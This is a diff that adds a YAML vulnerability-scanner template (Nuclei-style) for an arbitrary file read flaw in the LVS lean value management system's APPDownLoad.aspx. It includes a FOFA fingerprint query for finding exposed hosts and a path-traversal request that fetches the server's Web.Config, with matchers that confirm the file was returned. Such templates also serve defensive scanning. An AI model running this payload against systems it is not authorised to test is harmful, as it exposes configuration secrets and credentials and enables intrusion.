@@ -1,0 +1,31 @@
+id: poc-yaml-ji-la-ke-ji-appdownload-aspx-anyfile-read
+info:
+  name: LVS精益价值管理系统 APPDownLoad.aspx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    finger: LVS精益价值管理系统
+    fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Business/APPDownLoad.aspx?p=UploadFile/../Web.Config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "<appSettings>"
+        part: body
+      - type: word
+        words:
+          - "filename=Web.Config"
+        part: header
+      - type: word
+        words:
+          - "application/ms-excel"
+        part: header
